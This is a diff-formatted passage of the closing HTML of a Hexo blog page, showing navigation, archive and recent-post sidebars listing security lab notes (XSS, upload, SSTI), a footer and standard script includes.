+    <a href="/2023/08/03/upload-lab/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">2023/08/03：upload-lab记录</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/08/">August 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/07/">July 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/04/">April 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/03/">March 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/01/">January 2023</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2023/08/10/xssnote/">2023/08/10：xss笔记</a>
+          </li>
+        
+          <li>
+            <a href="/2023/08/10/uploadnote/">2023/08/10：upload笔记</a>
+          </li>
+        
+          <li>
+            <a href="/2023/08/10/sstinote/">2023/08/10：ssti笔记</a>
+          </li>
+        
+          <li>
+            <a href="/2023/08/03/upload-lab/">2023/08/03：upload-lab记录</a>
+          </li>
+        
+          <li>
+            <a href="/2023/07/28/sstilab/">2023/7/28：sstilab记录</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2023 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
